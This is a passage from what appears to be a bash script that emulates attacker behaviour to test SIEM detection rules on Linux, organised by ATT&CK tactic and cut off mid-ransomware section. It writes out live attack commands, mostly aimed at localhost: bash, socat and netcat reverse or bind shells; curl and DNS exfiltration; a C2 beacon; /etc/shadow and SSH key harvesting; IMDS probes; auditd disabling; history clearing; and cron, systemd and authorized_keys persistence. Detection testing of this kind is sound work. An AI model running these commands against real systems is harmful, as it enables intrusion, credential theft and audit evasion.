  trig "Base64-decoded shell exec → auditd EXECVE base64+bash chain"
  siem "RULE-L17" "Base64 encoded command executed via shell" "T1027"
  add_result "Execution" "RULE-L17" "BASE64_CMD_EXEC" "triggered" "base64_pipe_bash"

  info "Script interpreter spawning shell (RULE-L15)..."
  cmd_run "python3 -c \"import subprocess; subprocess.run(['/bin/sh','-c','id'])\" 2>/dev/null || true"
  trig "python3 → subprocess → /bin/sh → id  (interpreter chain)"
  siem "RULE-L15" "Script interpreter (python3) spawned shell" "T1059.006"
  add_result "Execution" "RULE-L15" "INTERPRETER_CHAIN" "triggered" "python3_sh"

  info "dd abuse pattern..."
  cmd_run "dd if=/dev/urandom of='${SOC_FILE}_dd' bs=1 count=64 2>/dev/null || true"
  trig "dd /dev/urandom → auditd EXECVE dd"
  add_result "Execution" "RULE-L14" "DD_ABUSE" "triggered" "dd_urandom"

  info "curl payload download attempt (safe fail)..."
  cmd_run "curl -s --max-time 2 http://127.0.0.1:9998/payload -o '${SOC_FILE}_payload' 2>/dev/null || true"
  cmd_run "wget -q --timeout=2 http://127.0.0.1:9998/payload -O '${SOC_FILE}_wget' 2>/dev/null || true"
  trig "curl/wget → auditd EXECVE + SYSCALL connect (connection refused = safe)"
  add_result "Execution" "RULE-L14" "CURL_WGET_PAYLOAD" "triggered" "curl_wget_127"

  info "Simulating web server spawning shell (RULE-L16)..."
  if id apache 2>/dev/null || id www-data &>/dev/null; then
    cmd_run "sudo -u $(id apache &>/dev/null && echo apache || echo www-data) bash -c 'id; whoami' 2>/dev/null || true"
    trig "www-data → bash → id → auditd USER_CMD + EXECVE"
    siem "RULE-L16" "Web server process (www-data) spawned interactive shell" "T1059.004"
    add_result "Execution" "RULE-L16" "WEB_SHELL_SIM" "triggered" "www_data_bash"
  else
    skip "www-data user not present — skipping web shell sim"
    add_result "Execution" "RULE-L16" "WEB_SHELL_SIM" "skipped" "www_data_missing"
  fi

  info "Memory execution pattern (RULE-L18)..."
  cmd_run "strings /proc/$$/environ 2>/dev/null | head -5 || true"
  cmd_run "cat /proc/self/maps 2>/dev/null | head -5 || true"
  trig "/proc/self/maps access → auditd OPEN SYSCALL"
  siem "RULE-L18" "Process memory access pattern — possible memfd/proc exec" "T1055"
  add_result "Execution" "RULE-L18" "PROC_MEM_ACCESS" "triggered" "proc_maps"

  cmd_run "auditctl -d always,exit -F arch=b64 -S execve -k lolbin_exec_${RND} 2>/dev/null || true"
  ok "Category Execution complete"
}


# =============================================================================
# CATEGORY 5 — Persistence
# =============================================================================
cat_persistence() {
  section "Persistence (RULE-L19 → L25)"

  mkdir -p "$SOC_DIR"
  awatch "/var/spool/cron"          "wa" "cron_watch_${RND}"
  awatch "/etc/systemd/system"      "wa" "systemd_watch_${RND}"
  awatch "/etc/cron.d"              "wa" "crond_watch_${RND}"

  info "Installing cron job persistence (RULE-L19)..."
  cmd_run "useradd -m -s /bin/bash '${SOC_USER}' 2>/dev/null || true"
  cmd_run "(echo '*/5 * * * * /tmp/soc_cron_${RND}.sh') | crontab -u '${SOC_USER}' -"
  trig "crontab write → cron log entry + auditd PATH"
  siem "RULE-L19" "New cron job installed for user ${SOC_USER}" "T1053.003"
  add_result "Persistence" "RULE-L19" "CRON_JOB_INSTALL" "triggered" "crontab_u"
  cmd_run "crontab -r -u '${SOC_USER}' 2>/dev/null || true"

  info "Installing systemd service (RULE-L20)..."
  cat > "/etc/systemd/system/${SOC_SERVICE}.service" << EOF 2>/dev/null || true
[Unit]
Description=SOC_TEST_${RND}
[Service]
ExecStart=/bin/sleep 999
[Install]
WantedBy=multi-user.target
EOF
  cmd_run "systemctl daemon-reload 2>/dev/null || true"
  cmd_run "systemctl enable '${SOC_SERVICE}' 2>/dev/null || true"
  cmd_run "systemctl start  '${SOC_SERVICE}' 2>/dev/null || true"
  trig "systemd service created+enabled → journal SERVICE_START + auditd PATH"
  siem "RULE-L20" "New systemd service installed: ${SOC_SERVICE}" "T1543.002"
  add_result "Persistence" "RULE-L20" "SYSTEMD_SERVICE_INSTALL" "triggered" "systemctl_enable"
  cmd_run "systemctl stop    '${SOC_SERVICE}' 2>/dev/null || true"
  cmd_run "systemctl disable '${SOC_SERVICE}' 2>/dev/null || true"
  cmd_run "rm -f '/etc/systemd/system/${SOC_SERVICE}.service'"
  cmd_run "systemctl daemon-reload 2>/dev/null || true"

  info ".bashrc modification (RULE-L21)..."
  cmd_run "useradd -m '${SOC_USER}' 2>/dev/null || true"
  awatch "/home/${SOC_USER}/.bashrc" "wa" "bashrc_watch_${RND}"
  cmd_run "echo \"# SOC_TEST_${RND} alias soc_persist='nc -e /bin/sh 127.0.0.1 9999'\" >> '/home/${SOC_USER}/.bashrc'"
  trig ".bashrc write → auditd OPEN+WRITE syscall on .bashrc"
  siem "RULE-L21" ".bashrc modified for user ${SOC_USER} — possible persistence" "T1546.004"
  add_result "Persistence" "RULE-L21" "BASHRC_MODIFIED" "triggered" "echo_bashrc"

  info "SSH authorized_keys modification (RULE-L22)..."
  mkdir -p /root/.ssh
  awatch "/root/.ssh/authorized_keys" "wa" "authkeys_watch_${RND}"
  cmd_run "ssh-keygen -t ed25519 -f '${SOC_KEY}' -N '' 2>/dev/null || true"
  cmd_run "echo '# SOC_TEST_${RND}' >> /root/.ssh/authorized_keys"
  trig "authorized_keys write → auditd OPEN+WRITE on /root/.ssh/authorized_keys"
  siem "RULE-L22" "SSH authorized_keys modified (root) — backdoor key" "T1098.004"
  add_result "Persistence" "RULE-L22" "AUTHKEYS_MODIFIED" "triggered" "echo_authkeys"
  cmd_run "sed -i '/SOC_TEST_${RND}/d' /root/.ssh/authorized_keys 2>/dev/null || true"
  cmd_run "rm -f '${SOC_KEY}' '${SOC_KEY}.pub'"

  info "at job persistence (RULE-L25)..."
  if command -v at &>/dev/null; then
    local atjob_out
    atjob_out=$(echo "/bin/echo soc_at_${RND}" | at now + 60 minutes 2>&1 || true)
    local atjob_id
    atjob_id=$(echo "$atjob_out" | grep -o 'job [0-9]*' | awk '{print $2}' || echo "")
    trig "at job queued → syslog atd entry"
    siem "RULE-L25" "at job scheduled — T1053.001 persistence" "T1053.001"
    add_result "Persistence" "RULE-L25" "AT_JOB_INSTALL" "triggered" "at_cmd"
    [[ -n "$atjob_id" ]] && cmd_run "atrm '${atjob_id}' 2>/dev/null || true"
  else
    skip "at not installed"
    add_result "Persistence" "RULE-L25" "AT_JOB_INSTALL" "skipped" "at_missing"
  fi

  info "/etc/cron.d persistence..."
  cmd_run "echo '# SOC_TEST_${RND}' > '/etc/cron.d/soc_persist_${RND}'"
  cmd_run "echo '*/10 * * * * root /tmp/soc_cron_${RND}.sh' >> '/etc/cron.d/soc_persist_${RND}'"
  trig "/etc/cron.d write → auditd PATH"
  add_result "Persistence" "RULE-L19" "CROND_FILE_CREATED" "triggered" "etc_crond"
  cmd_run "rm -f '/etc/cron.d/soc_persist_${RND}'"

  cmd_run "userdel -r '${SOC_USER}' 2>/dev/null || true"
  ok "Category Persistence complete"
}


# =============================================================================
# CATEGORY 6 — Defense Evasion
# =============================================================================
cat_defenseevasion() {
  section "Defense Evasion (RULE-L26 → L31)"

  mkdir -p "$SOC_DIR"

  info "auditd tamper — disable then re-enable (RULE-L26)..."
  cmd_run "auditctl -e 0 2>/dev/null || true"
  sleep 0.5
  cmd_run "auditctl -e 1 2>/dev/null || true"
  trig "auditctl -e 0 → CONFIG_CHANGE; immediately re-enabled"
  siem "RULE-L26" "auditd disabled then re-enabled — evasion indicator" "T1562.012"
  add_result "DefenseEvasion" "RULE-L26" "AUDITD_DISABLED" "triggered" "auditctl_e0"

  info "auditd rules flush (RULE-L26)..."
  cmd_run "auditctl -D 2>/dev/null || true"
  sleep 0.3
  cmd_run "auditctl -a always,exit -F arch=b64 -S execve -k soc_exec_${RND} 2>/dev/null || true"
  trig "auditctl -D → CONFIG_CHANGE (all rules deleted and re-added)"
  add_result "DefenseEvasion" "RULE-L26" "AUDITD_RULES_FLUSHED" "triggered" "auditctl_D"

  info "Log file truncation simulation (RULE-L27)..."
  local AUTH_LOG
  AUTH_LOG=$([ -f /var/log/auth.log ] && echo "/var/log/auth.log" || echo "/var/log/secure")
  awatch "$AUTH_LOG" "wa" "authlog_watch_${RND}"
  local fake_log="${SOC_FILE}_fakelog"
  cmd_run "logger -t soc_test 'SOC_TEST_${RND} — fake auth log entry'"
  cmd_run "cp /var/log/auth.log '${fake_log}' 2>/dev/null || echo 'fake_log' > '${fake_log}'"
  cmd_run ": > '${fake_log}'"
  trig "log truncation → auditd OPEN+TRUNC SYSCALL"
  siem "RULE-L27" "Log file truncated — T1070.002 indicator" "T1070.002"
  add_result "DefenseEvasion" "RULE-L27" "LOG_TRUNCATED" "triggered" "truncate_log"

  info "Bash history cleared (RULE-L28)..."
  awatch "/root/.bash_history" "wa" "history_watch_${RND}"
  cmd_run "history -c 2>/dev/null || true"
  cmd_run "history -w 2>/dev/null || true"
  cmd_run "export HISTSIZE=0; unset HISTFILE 2>/dev/null || true"
  trig "history -c + HISTSIZE=0 → auditd OPEN+WRITE .bash_history"
  siem "RULE-L28" "Bash history cleared + HISTFILE unset — evasion" "T1070.003"
  add_result "DefenseEvasion" "RULE-L28" "HISTORY_CLEARED" "triggered" "history_c"
  cmd_run "export HISTSIZE=1000"

  info "Timestomping — backdating file to 2020 (RULE-L29)..."
  cmd_run "touch '${SOC_DIR}/soc_sensitive_${RND}.sh'"
  awatch "${SOC_DIR}" "a" "timestamp_watch_${RND}"
  cmd_run "touch -t 202001010000 '${SOC_DIR}/soc_sensitive_${RND}.sh'"
  trig "touch -t → auditd SYSCALL utimes"
  siem "RULE-L29" "File timestamp backdated to 2020 — timestomping" "T1070.006"
  add_result "DefenseEvasion" "RULE-L29" "TIMESTOMPING" "triggered" "touch_t"

  info "chattr +i immutable bit (RULE-L30)..."
  local immutable_file="${SOC_DIR}/soc_immutable_${RND}"
  cmd_run "touch '${immutable_file}'"
  cmd_run "chattr +i '${immutable_file}' 2>/dev/null || true"
  trig "chattr +i → auditd SYSCALL ioctl"
  siem "RULE-L30" "File set immutable with chattr — T1222 evasion" "T1222"
  add_result "DefenseEvasion" "RULE-L30" "CHATTR_IMMUTABLE" "triggered" "chattr_i"
  cmd_run "chattr -i '${immutable_file}' 2>/dev/null || true"
  cmd_run "rm -f '${immutable_file}'"

  info "Kernel module enumeration (RULE-L31)..."
  cmd_run "auditctl -a always,exit -F arch=b64 -S init_module    -k kmod_load_${RND}   2>/dev/null || true"
  cmd_run "auditctl -a always,exit -F arch=b64 -S delete_module  -k kmod_unload_${RND} 2>/dev/null || true"
  cmd_run "lsmod > '${SOC_FILE}_lsmod' 2>/dev/null || true"
  cmd_run "cat /proc/modules | head -5 2>/dev/null || true"
  local first_mod
  first_mod=$(lsmod 2>/dev/null | awk 'NR==2{print $1}' || echo "")
  [[ -n "$first_mod" ]] && cmd_run "modinfo '${first_mod}' 2>/dev/null | head -5 || true"
  partial "Kernel module enumeration → auditd EXECVE (insmod/rmmod requires test module)"
  siem "RULE-L31" "Kernel module enumeration — possible rootkit preparation" "T1547.006"
  add_result "DefenseEvasion" "RULE-L31" "KMOD_ENUM" "partial" "lsmod_modinfo"

  ok "Category DefenseEvasion complete"
}


# =============================================================================
# CATEGORY 7 — Credential Access
# =============================================================================
cat_credaccess() {
  section "Credential Access (RULE-L32 → L36)"

  mkdir -p "$SOC_DIR"
  awatch "/etc/shadow"   "rwa" "shadow_cred_${RND}"
  awatch "/etc/passwd"   "rwa" "passwd_cred_${RND}"
  awatch "/root/.ssh"    "rwa" "ssh_key_${RND}"
  asyscall "ptrace"            "ptrace_watch_${RND}"

  info "/etc/shadow access — credential dump (RULE-L32)..."
  cmd_run "cat /etc/shadow 2>/dev/null | head -3 || true"
  cmd_run "python3 -c \"open('/etc/shadow').read()\" 2>/dev/null || true"
  trig "/etc/shadow read attempt → auditd SYSCALL open + PATH (even if denied)"
  siem "RULE-L32" "/etc/shadow accessed — credential dump attempt" "T1003.008"
  add_result "CredAccess" "RULE-L32" "SHADOW_DUMP" "triggered" "cat_shadow_python"

  info "/etc/passwd enumeration (T1087)..."
  cmd_run "cat /etc/passwd | grep -v nologin 2>/dev/null || true"
  cmd_run "awk -F: '\$3 >= 1000 {print}' /etc/passwd 2>/dev/null || true"
  trig "/etc/passwd read → auditd SYSCALL open + PATH"
  add_result "CredAccess" "RULE-L34" "PASSWD_ENUM" "triggered" "awk_passwd"

  info "SSH key harvesting (RULE-L33)..."
  cmd_run "ls -la /root/.ssh/ 2>/dev/null || true"
  cmd_run "find /home -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null | head -10 || true"
  trig "/root/.ssh directory access → auditd DIR read SYSCALL"
  siem "RULE-L33" "SSH private key files accessed/enumerated" "T1552.004"
  add_result "CredAccess" "RULE-L33" "SSH_KEY_HARVEST" "triggered" "find_ssh_keys"

  info "Bulk credential file search (RULE-L34)..."
  cmd_run "find /etc /var /tmp -name '*.pem' -o -name '*.key' -o -name '.env' -o -name 'credentials' 2>/dev/null | head -20 || true"
  cmd_run "grep -r 'password' /etc/ssh/ 2>/dev/null | head -5 || true"
  trig "Bulk find+grep credential search → mass auditd SYSCALL open records"
  siem "RULE-L34" "Bulk credential file search pattern detected" "T1552"
  add_result "CredAccess" "RULE-L34" "CRED_FILE_SEARCH" "triggered" "find_grep_creds"

  info "/proc memory access — credential dump (RULE-L35)..."
  cmd_run "strings /proc/$$/environ 2>/dev/null | head -10 || true"
  cmd_run "cat /proc/self/maps 2>/dev/null | head -5 || true"
  cmd_run "python3 -c 'import ctypes; ctypes.CDLL(None)' 2>/dev/null || true"
  trig "/proc/self/environ + /proc/maps read → auditd OPEN SYSCALL"
  siem "RULE-L35" "Process memory access — credential dump pattern" "T1003"
  add_result "CredAccess" "RULE-L35" "PROC_MEM_CRED_DUMP" "triggered" "proc_environ_maps"

  info "Bash history credential grep..."
  cmd_run "cat ~/.bash_history 2>/dev/null | grep -iE 'password|curl.*-u|mysql.*-p' | head -5 || true"
  cmd_run "grep -riE 'password|passwd|secret|api_key|token' /tmp/ /var/tmp/ 2>/dev/null | head -5 || true"
  trig "Credential pattern grep → auditd EXECVE grep"
  add_result "CredAccess" "RULE-L34" "BASH_HIST_CRED_GREP" "triggered" "grep_history"

  ok "Category CredAccess complete"
}


# =============================================================================
# CATEGORY 8 — Discovery / Enumeration
# =============================================================================
cat_discovery() {
  section "Discovery / Enumeration (RULE-L37 → L40)"

  mkdir -p "$SOC_DIR"
  cmd_run "auditctl -a always,exit -F arch=b64 -S execve -k discovery_burst_${RND} 2>/dev/null || true"

  info "Network discovery burst (RULE-L37)..."
  local net_cmds=(
    "ip addr show"
    "ip route show"
    "ip neigh show"
    "ss -tulnp"
    "ss -anp"
    "arp -a"
    "cat /etc/hosts"
    "cat /etc/resolv.conf"
  )
  for c in "${net_cmds[@]}"; do
    cmd_run "$c 2>/dev/null | head -5 || true"
    sleep "$DELAY"
  done

  if command -v nmap &>/dev/null; then
    cmd_run "nmap -sn 127.0.0.0/8 --max-retries 0 -T2 2>/dev/null | head -10 || true"
    trig "nmap subnet scan → auditd EXECVE nmap"
    add_result "Discovery" "RULE-L37" "NMAP_SCAN" "triggered" "nmap_sn"
  else
    skip "nmap not installed — skipping subnet scan"
    add_result "Discovery" "RULE-L37" "NMAP_SCAN" "skipped" "nmap_missing"
  fi
  cmd_run "ping -c 1 8.8.8.8 2>/dev/null || true"
  siem "RULE-L37" "Network/host discovery burst — ip/ss/arp/nmap chain" "T1046"
  add_result "Discovery" "RULE-L37" "NET_DISCOVERY_BURST" "triggered" "ip_ss_arp_chain"

  info "System information discovery..."
  local sys_cmds=(
    "uname -a"
    "hostname"
    "cat /etc/os-release"
    "cat /proc/version"
    "df -h"
    "ps aux"
    "systemctl list-units --type=service --state=running"
    "cat /etc/crontab"
    "ls -la /etc/cron.d/"
  )
  for c in "${sys_cmds[@]}"; do
    cmd_run "$c 2>/dev/null | head -5 || true"
    sleep "$DELAY"
  done
  trig "System discovery chain → auditd EXECVE burst"
  add_result "Discovery" "RULE-L37" "SYS_DISCOVERY" "triggered" "uname_ps_systemctl"

  info "User/group enumeration burst (RULE-L38)..."
  local user_cmds=(
    "cat /etc/passwd | grep -v nologin"
    "getent passwd"
    "lastlog 2>/dev/null | head -10"
    "last | head -10"
    "who"
    "w"
    "id"
    "groups"
  )
  for c in "${user_cmds[@]}"; do
    cmd_run "$c 2>/dev/null | head -5 || true"
    sleep "$DELAY"
  done
  siem "RULE-L38" "User/group enumeration burst — passwd/lastlog/who/w chain" "T1087"
  add_result "Discovery" "RULE-L38" "USER_ENUM_BURST" "triggered" "passwd_lastlog_who"

  info "Security tool enumeration (RULE-L39)..."
  local sec_cmds=(
    "which auditd 2>/dev/null || true"
    "ps aux | grep -iE 'auditd|fail2ban|wazuh|falco|osquery' 2>/dev/null | grep -v grep || true"
    "which fail2ban 2>/dev/null || true"
    "which ufw 2>/dev/null || true"
    "ls /etc/audit/ 2>/dev/null || true"
    "dpkg -l 2>/dev/null | grep -iE 'security|ids|audit|monitor' | head -5 || true"
  )
  for c in "${sec_cmds[@]}"; do
    cmd_run "$c"
    sleep "$DELAY"
  done
  siem "RULE-L39" "Security tool enumeration — auditd/fail2ban/wazuh/falco probed" "T1518.001"
  add_result "Discovery" "RULE-L39" "SEC_TOOL_ENUM" "triggered" "which_ps_grep_sec"

  info "Cloud/container metadata access (RULE-L40)..."
  cmd_run "curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5 || true"
  cmd_run "curl -s --max-time 2 http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -5 || true"
  cmd_run "cat /proc/1/cgroup 2>/dev/null | head -5 || true"
  siem "RULE-L40" "Cloud/container IMDS metadata endpoint accessed" "T1552.005"
  add_result "Discovery" "RULE-L40" "CLOUD_METADATA_PROBE" "triggered" "curl_imds"

  cmd_run "auditctl -d always,exit -F arch=b64 -S execve -k discovery_burst_${RND} 2>/dev/null || true"
  ok "Category Discovery complete"
}


# =============================================================================
# CATEGORY 9 — Lateral Movement
# =============================================================================
cat_lateralmovement() {
  section "Lateral Movement (RULE-L41 → L44)"

  mkdir -p "$SOC_DIR"

  info "SSH lateral movement — key-based (RULE-L41)..."
  cmd_run "ssh-keygen -t ed25519 -f '${SOC_KEY}' -N '' 2>/dev/null || true"
  cmd_run "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
    -i '${SOC_KEY}' root@127.0.0.1 'hostname; id' 2>/dev/null || true"
  trig "SSH key auth attempt → auth.log + auditd EXECVE ssh"
  siem "RULE-L41" "SSH key-based auth to remote host — lateral move attempt" "T1021.004"
  add_result "LateralMovement" "RULE-L41" "SSH_LATERAL" "triggered" "ssh_key_127"

  info "SCP data staging (RULE-L42)..."
  for i in {1..5}; do
    cmd_run "echo 'SOC_LOOT_${RND}' > '${SOC_DIR}/soc_loot_${i}.txt'"
  done
  cmd_run "scp -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
    -i '${SOC_KEY}' '${SOC_DIR}'/soc_loot_*.txt root@127.0.0.1:/tmp/ 2>/dev/null || true"
  trig "scp staging → auditd EXECVE scp + SYSCALL connect"
  siem "RULE-L42" "SCP data transfer to remote host — staging for exfil" "T1021.004"
  add_result "LateralMovement" "RULE-L42" "SCP_STAGING" "triggered" "scp_127"

  if command -v rsync &>/dev/null; then
    info "rsync staging..."
    cmd_run "rsync -avz '${SOC_DIR}/' root@127.0.0.1:/tmp/soc_rsync_${RND}/ 2>/dev/null || true"
    trig "rsync → auditd EXECVE rsync"
    add_result "LateralMovement" "RULE-L42" "RSYNC_STAGING" "triggered" "rsync_127"
  else
    skip "rsync not installed"
    add_result "LateralMovement" "RULE-L42" "RSYNC_STAGING" "skipped" "rsync_missing"
  fi

  info "Remote command execution via SSH (RULE-L44)..."
  cmd_run "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
    root@127.0.0.1 'cat /etc/passwd | head -3; id; whoami' 2>/dev/null || true"
  trig "SSH remote command → auth.log + auditd"
  siem "RULE-L44" "Remote command executed via SSH — lateral move" "T1021.004"
  add_result "LateralMovement" "RULE-L44" "SSH_REMOTE_CMD" "triggered" "ssh_cmd_127"

  if command -v nmap &>/dev/null; then
    info "Port scan localhost (safe)..."
    cmd_run "nmap -p 22,80,443,3306,5432,6379 127.0.0.1 2>/dev/null | head -20 || true"
    trig "nmap port scan → auditd EXECVE nmap + SYSCALL connect"
    add_result "LateralMovement" "RULE-L41" "PORT_SCAN_LOCAL" "triggered" "nmap_ports"
  else
    skip "nmap missing"
    add_result "LateralMovement" "RULE-L41" "PORT_SCAN_LOCAL" "skipped" "nmap_missing"
  fi

  info "Unusual process → network connection (RULE-L43)..."
  cmd_run "python3 -c \
    \"import socket; s=socket.socket(); s.settimeout(1); s.connect(('127.0.0.1',4444))\" \
    2>/dev/null || true"
  cmd_run "bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444' 2>/dev/null || true"
  trig "python3/bash socket to port 4444 → auditd SYSCALL connect"
  siem "RULE-L43" "Python/bash making connection to unusual port 4444" "T1071"
  add_result "LateralMovement" "RULE-L43" "UNUSUAL_NET_CONNECT" "triggered" "python_bash_socket"

  cmd_run "rm -f '${SOC_KEY}' '${SOC_KEY}.pub'"
  ok "Category LateralMovement complete"
}


# =============================================================================
# CATEGORY 10 — Exfiltration Simulation
# =============================================================================
cat_exfil() {
  section "Exfiltration (RULE-L45 → L49)"

  mkdir -p "${SOC_DIR}/sensitive"
  awatch "${SOC_DIR}/sensitive" "rwa" "sensitive_access_${RND}"

  info "Creating 30 sensitive staging files..."
  for i in $(seq 1 30); do
    cmd_run "echo 'SOC_SECRET_DATA_${RND}_file${i}' > '${SOC_DIR}/sensitive/soc_creds_${i}.txt'"
  done
  trig "30 sensitive files created in staging dir"

  info "Archiving staged data (RULE-L45)..."
  cmd_run "tar czf '/tmp/soc_exfil_${RND}.tar.gz' '${SOC_DIR}/sensitive/' 2>/dev/null || true"
  cmd_run "zip -r '/tmp/soc_exfil_${RND}.zip' '${SOC_DIR}/sensitive/' 2>/dev/null || true"
  trig "tar + zip → auditd EXECVE tar/zip"
  siem "RULE-L45" "Data archived — exfil staging pattern (tar+zip)" "T1560"
  add_result "Exfil" "RULE-L45" "DATA_ARCHIVED" "triggered" "tar_zip_staging"

  info "Base64 encoding of archive (RULE-L46)..."
  cmd_run "base64 '/tmp/soc_exfil_${RND}.tar.gz' > '/tmp/soc_encoded_${RND}.b64' 2>/dev/null || true"
  trig "base64 encode → auditd EXECVE base64"
  siem "RULE-L46" "Data encoded with base64 — exfil encoding" "T1027"
  add_result "Exfil" "RULE-L46" "DATA_ENCODED_B64" "triggered" "base64_encode"

  info "curl POST exfil attempt (safe fail) (RULE-L48)..."
  cmd_run "curl -s -X POST --data-binary '@/tmp/soc_encoded_${RND}.b64' \
    http://127.0.0.1:8443/exfil --max-time 2 2>/dev/null || true"
  cmd_run "curl -s 'http://127.0.0.1:8443/c2?data=\$(cat /etc/hostname | base64)' \
    --max-time 2 2>/dev/null || true"
  trig "curl POST to exfil endpoint → auditd EXECVE curl + SYSCALL connect"
  siem "RULE-L48" "curl sending data to external endpoint — exfil attempt" "T1048"
  add_result "Exfil" "RULE-L48" "CURL_EXFIL" "triggered" "curl_post_data"

  info "DNS exfiltration burst (RULE-L47)..."
  for i in $(seq 1 "${BURST}"); do
    local chunk
    chunk=$(echo "soc_secret_${i}_${RND}" | base64 | tr -d '=\n' | cut -c1-40)
    if command -v dig &>/dev/null; then
      cmd_run "dig '${chunk}.soc-exfil.soctest.local' @127.0.0.1 2>/dev/null | head -3 || true"
    elif command -v nslookup &>/dev/null; then
      cmd_run "nslookup '${chunk}.soc-exfil.soctest.local' 127.0.0.1 2>/dev/null | head -3 || true"
    fi
    sleep "$DELAY"
  done
  trig "DNS tunnel pattern → burst of base64-encoded DNS queries"
  siem "RULE-L47" "DNS exfiltration pattern — burst encoded DNS queries" "T1048.003"
  add_result "Exfil" "RULE-L47" "DNS_EXFIL_PATTERN" "triggered" "dig_nslookup_b64"

  info "Netcat file transfer attempt (RULE-L49, safe fail)..."
  if command -v nc &>/dev/null; then
    cmd_run "nc -w 1 127.0.0.1 9999 < '/tmp/soc_exfil_${RND}.tar.gz' 2>/dev/null || true"
    trig "nc → auditd EXECVE nc + SYSCALL connect (refused = safe)"
    siem "RULE-L49" "Netcat data transfer attempt on port 9999" "T1048"
    add_result "Exfil" "RULE-L49" "NC_FILE_TRANSFER" "triggered" "nc_127_9999"
  else
    skip "nc not installed"
    add_result "Exfil" "RULE-L49" "NC_FILE_TRANSFER" "skipped" "nc_missing"
  fi

  ok "Category Exfil complete"
}


# =============================================================================
# CATEGORY 11 — C2 / Reverse Shell Simulation
# =============================================================================
cat_c2() {
  section "C2 / Reverse Shell (RULE-L50 → L53)"

  mkdir -p "$SOC_DIR"

  info "Bash reverse shell attempt (RULE-L50)..."
  cmd_run "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 & sleep 1; kill %1 2>/dev/null || true"
  trig "bash -i >& /dev/tcp — stdout redirect to socket → auditd EXECVE + SYSCALL connect"
  siem "RULE-L50" "Bash reverse shell — stdout redirected to socket" "T1059.004"
  add_result "C2" "RULE-L50" "BASH_REVSHELL" "triggered" "bash_devtcp"

  info "Python reverse shell attempt (RULE-L50)..."
  cmd_run "timeout 2 python3 -c \"
import socket,subprocess,os
s=socket.socket()
s.settimeout(1)
try: s.connect(('127.0.0.1',4444))
except: pass
\" 2>/dev/null || true"
  trig "python3 socket.connect(4444) → auditd EXECVE python3 + SYSCALL socket+connect"
  add_result "C2" "RULE-L50" "PYTHON_REVSHELL" "triggered" "python_socket_4444"

  info "Netcat bind shell on port 54321 (RULE-L52)..."
  if command -v nc &>/dev/null; then
    cmd_run "nc -l -p 54321 & sleep 2; kill %1 2>/dev/null || true"
    trig "nc -l listener → auditd EXECVE nc + SYSCALL socket+bind+listen"
    siem "RULE-L52" "Netcat listener spawned on unusual port 54321" "T1571"
    add_result "C2" "RULE-L52" "NC_BIND_SHELL" "triggered" "nc_listen_54321"
  else
    skip "nc not installed"
    add_result "C2" "RULE-L52" "NC_BIND_SHELL" "skipped" "nc_missing"
  fi

  if command -v socat &>/dev/null; then
    info "Socat reverse shell attempt (RULE-L50)..."
    cmd_run "timeout 2 socat TCP:127.0.0.1:4444 EXEC:/bin/bash 2>/dev/null || true"
    trig "socat TCP:4444 EXEC:/bin/bash → auditd EXECVE socat"
    add_result "C2" "RULE-L50" "SOCAT_REVSHELL" "triggered" "socat_tcp_exec"
  else
    skip "socat not installed"
    add_result "C2" "RULE-L50" "SOCAT_REVSHELL" "skipped" "socat_missing"
  fi

  # ── 5. C2 beacon simulation (RULE-L51) ────────────────────────────────────
  # FIX: removed 'local' from subshell (no-op but noisy), reduced sleep to 5s
  info "C2 beacon simulation — periodic HTTP with jitter (RULE-L51)..."
  (
    for i in $(seq 1 "${BURST}"); do
      curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        http://127.0.0.1:8080/beacon --max-time 1 2>/dev/null || true
      jitter=$(( RANDOM % 3 + 1 ))
      sleep "$jitter"
    done
  ) &
  local BEACON_PID=$!
  sleep 5
  kill "$BEACON_PID" 2>/dev/null || true
  trig "Periodic HTTP GET /beacon with jitter → auditd EXECVE curl (${BURST} beacons)"
  siem "RULE-L51" "Beacon pattern — periodic HTTP requests with random jitter" "T1071.001"
  add_result "C2" "RULE-L51" "C2_BEACON_SIM" "triggered" "curl_periodic_jitter"

  info "C2 cron persistence (RULE-L50)..."
  cmd_run "echo '# SOC_C2_${RND} /tmp/soc_c2_agent_${RND}.sh' > '/etc/cron.d/soc_c2_${RND}'"
  cmd_run "echo '* * * * * root /tmp/soc_c2_agent_${RND}.sh' >> '/etc/cron.d/soc_c2_${RND}'"
  trig "/etc/cron.d write → auditd OPEN+WRITE"
  siem "RULE-L50" "C2 agent persistence via cron installed" "T1053.003"
  add_result "C2" "RULE-L50" "C2_CRON_PERSIST" "triggered" "crond_c2"
  cmd_run "rm -f '/etc/cron.d/soc_c2_${RND}'"

  ok "Category C2 complete"
}


# =============================================================================
# CATEGORY 12 — Ransomware Simulation
# =============================================================================
cat_ransomware() {
  section "Ransomware Simulation (RULE-L54 → L58)"

  mkdir -p "${SOC_DIR}/userdata/documents"
  mkdir -p "${SOC_DIR}/userdata/photos"
  mkdir -p "${SOC_DIR}/userdata/finance"

  info "Creating 90 victim documents..."
  for i in $(seq 1 50); do cmd_run "echo 'SOC_DOC_${RND}' > '${SOC_DIR}/userdata/documents/soc_doc_${i}.docx'"; done
  for i in $(seq 1 20); do cmd_run "echo 'SOC_PHOTO_${RND}' > '${SOC_DIR}/userdata/photos/soc_img_${i}.jpg'"; done
  for i in $(seq 1 20); do cmd_run "echo 'SOC_FINANCE_${RND}' > '${SOC_DIR}/userdata/finance/soc_fin_${i}.xlsx'"; done

  awatch "${SOC_DIR}/userdata" "rwa" "ransomware_watch_${RND}"

  info "Pre-ransomware defense evasion chain (RULE-L58)..."
  cmd_run "auditctl -e 0 2>/dev/null || true; sleep 0.5; auditctl -e 1 2>/dev/null || true"
  cmd_run "history -c 2>/dev/null || true"
  siem "RULE-L58" "Pre-ransomware evasion chain — auditd disable + history clear" "T1562.012"
  add_result "Ransomware" "RULE-L58" "PRE_RANSOM_EVASION" "triggered" "auditd_e0_histc"

  info "Mass file read — ransomware pre-encryption scan (RULE-L54)..."
  cmd_run "find '${SOC_DIR}/userdata' -type f -exec cat {} \; > /dev/null 2>/dev/null || true"
  trig "Mass file read (90 files) → mass auditd OPEN+READ from same PID"
